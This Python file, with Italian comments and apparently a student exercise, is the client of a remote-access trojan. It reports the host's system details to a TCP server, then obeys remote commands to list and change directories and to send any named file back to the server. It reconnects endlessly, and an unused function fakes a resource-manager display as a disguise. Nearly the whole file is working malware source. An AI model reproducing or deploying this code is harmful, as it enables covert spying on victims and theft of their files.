import os
import pickle
from socket import *
import platform
import psutil
import time
import signal
from os import name, system

IP="localhost"
PORT = 12000 #Porta di Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"
FORMATWIN="windows-1252"
FORMATPDF="latin-1"

#funzione di pulizia schermo per unix e windows
def clearScreen():
    #for windows
    if name == 'nt':
        _ = system('cls')
    #for mac and linux(here, os.name is 'posix')
    else:
        _ = system('clear')


#comportamento da trojan
def trojanBehaviour():

    while True:
        try:
            cpu=psutil.cpu_percent()
            ram=psutil.virtual_memory().percent
            disk=psutil.disk_usage("/").percent
            processes_count=0
            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
            print("              --     Task manager: Current state of usage      --\n\n")
            #facciamo un display a video dell'utilizzo
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),int(ram),int(disk),processes_count))
            print("              --------------------------------------------------------- ")
            time.sleep(1)
            clearScreen()
        except:
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")


#gestisce il ctrl-C per l'uscita
def signalHandler(signum,frame):
    msg="Uscita effettuata con successo"
    print(":",msg,end="",flush=True)
    exit(1)


#manda le informazioni base
def sendInfo(client):
    # Info piattaforma
    mando = 1
    # Mando le informazioni raccolte al Server
    while mando == 1:
        try:
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release()+ "\nPath: " + os.getcwd()
            client.send((str((len(infos)))).encode(FORMAT))
            client.send(((infos)).encode(FORMAT))
            mando = 0
        except:
            client.send(("[ERROR] Dati non mandati correttamente, riprovare? Y/N ").encode(FORMAT))
            risposta = client.recv(1024).decode(FORMAT)
            if risposta == "Y" or risposta == "y":
                mando = 1
            elif risposta == "N" or risposta == "n":
                mando = 0


def clientConnection():
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(ADDR)
        print(f"Connessione avvenuta")
        return client
    except:
        print(f"\nConnessione non riuscita: riprovo tra 10 secondi...")
        time.sleep(10)
        clientConnection()


def openRemoteControl(client):

    comando="null"

    while comando != "exit":
        client.send((os.getcwd()).encode(FORMAT))
        comando = client.recv(1024).decode(FORMAT)

        if comando[0:8] == "download":
            filename=comando[10:len(comando)-1]
            filesize=os.path.getsize(filename)
            numeroByteLetti=0

            with open(filename, 'rb') as f:
                line = f.read(1024)
                # Keep sending data to the client
                while (line):
                    client.send(line)
                    line = f.read(1024)
                f.close()
                break
        elif comando[0:5] == "cd ..":
            os.chdir("..")
        elif comando[0:2] == "cd":
            path=comando[3:]
            os.chdir(os.getcwd() + "/" + path)
        elif comando[0:2] == "ls":
            #ritorna una lista
            listdir=os.listdir()
            #faccio un dump per poterla inoltrare
            data=pickle.dumps(listdir)
            client.send(data)
    print("Procedura di controllo remoto conclusa con successo")


def main():

        signal.signal(signal.SIGINT,signalHandler)
        client=clientConnection()
        print("Invio informazioni sul mio sistema al server")

        sendInfo(client)
        openRemoteControl(client)
        client.close()



    #start trojan
    #thread_trojan=Thread(target=trojanBehaviour)
    #thread_trojan.start()
    #thead_remoteControl=Thread(target=remoteControl)


if __name__ == "__main__":

    while True:
        try:
            main()
        except:
            print("Mi sto riconnetendo")